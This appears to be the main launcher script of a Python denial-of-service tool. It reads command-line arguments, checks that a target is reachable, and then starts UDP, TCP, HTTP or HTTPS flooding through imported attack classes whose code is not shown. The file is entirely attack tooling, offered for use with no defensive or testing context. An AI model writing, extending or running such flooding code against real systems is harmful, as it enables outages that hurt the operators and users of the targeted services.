from src import show_banner
from src.arg_parser import arg_parser
from src import TargetValidator
from src.dos import HTTPDos, SocketDos, TCP, UDP, DEFAULT_NUM_THREADS
from src.utils import resume


def main():
    args = arg_parser()
    attack(args)


def attack(args):
    resume(args)

    if trying_connection(args):
        if args.attack in ('udp', 'tcp'):
            return SocketDos(args).start_flood()
        elif args.attack in ('http', 'https'):
            return HTTPDos(args).start_flood()


def trying_connection(args):
    target_validator = TargetValidator(args)
    target_validated = target_validator.validate()

    if target_validated:
        return True
    return False


if __name__ == "__main__":
    show_banner()
    main()
